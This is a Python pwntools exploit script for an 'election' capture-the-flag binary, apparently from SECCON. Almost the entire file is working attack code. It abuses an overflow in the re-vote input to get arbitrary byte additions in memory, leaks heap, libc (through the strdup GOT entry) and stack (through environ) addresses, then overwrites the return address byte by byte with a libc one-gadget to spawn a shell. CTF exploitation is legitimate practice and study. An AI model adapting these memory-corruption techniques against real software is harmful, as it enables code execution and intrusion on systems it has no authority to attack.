from pwn import * 


def stand(name):
	global p
	p.sendlineafter('>>','1')
	p.sendlineafter('>>',name)

def vote( name, print_cand = 'n'):
	global p
	p.sendlineafter('>> ', '2')
	p.sendlineafter('Show candidates? (Y/n) ', print_cand)
	x = p.recvuntil('Enter the name of the candidate.\n>> ')
	p.sendline('oshima')
	p.recvuntil('and re-vote?\n>> ')
	p.send(name)
	return x

e = ELF('./election')
e_libc = ELF('./libc-2.23.so')


got_strdup = e.symbols['got.strdup']
list_addr = e.symbols['list']

p = process('./election')
#p = remote('election.pwn.seccon.jp',28349)

log.info('leaking candidate list addr')
for i in range(0x20):
	vote('yes\x00' + '\x61'*28)

x = vote('pwncupine','Y')
ojima_chunk = u64(re.findall('\* (.+)',x)[2].ljust(8, '\x00'))
list_head = ojima_chunk - 0x70
log.info('Ojima Chunk: {}\n List Head: {}'.format(hex(ojima_chunk), hex(list_head)))

log.info('leaking libc')
#first we need to undo the vote
#st == send this
st = 'yes\x00'
st += 'a' * 28 #junk
st += p64(e.symbols['lv'] - 0x10) #target to write to
st += p8(-1, signed = True) #amount to add to target's value
vote(st)

stand(p64(e.got['strdup']))
st = 'yes\x00'
st += 'a' * 28 #junk
st += p64(list_head + 0x48) #target to write to
st += p8(0x70, signed = True) #amount to add to target's value
vote(st)
vote(st)
x= vote('pwncupine', 'Y')
libc =  u64(re.findall('\* (.+)',x)[3].ljust(8, '\x00'))
libc -= e_libc.symbols['strdup']

log.info('libc: {}'.format(hex(libc)))

log.info('leaking env in libc to get stack address')
#see https://github.com/Naetw/CTF-pwn-tips#leak-stack-address for more details
#undoing vote again
st = 'yes\x00'
st += 'a' * 28 #junk
st += p64(e.symbols['lv'] - 0x10) #target to write to
st += p8(-1, signed = True) #amount to add to target's value
vote(st)

stand(p64(libc + e_libc.symbols['environ']))
st = 'yes\x00'
st += 'a' * 28 #junk
st += p64(list_head + 0x48) #target to write to
st += p8(0x40, signed = True) #amount to add to target's value
vote(st)

x= vote('pwncupine', 'Y')
environ =  u64(re.findall('\* (.+)',x)[4].ljust(8, '\x00'))

rip = environ - 0xf0
log.info('rip: {}'.format(hex(rip)))

gadget = libc + 0x45216
real_value_at_rip = libc + 0x20830
log.info('gadget: {}'.format(hex(gadget)))
rip_diff = []
for i in range(9):
	a =(gadget >> (8-i)*8) & 0xff
	b =(real_value_at_rip >> (8-i)*8) & 0xff
	rip_diff.append(a-b)

for diff in rip_diff:
	st = 'yes\x00'
	st += 'a' * 28
	st += p64(rip+8 - 0x10)
	st += p8(diff,signed=True)
	rip-=1
	vote(st)

p.interactive()
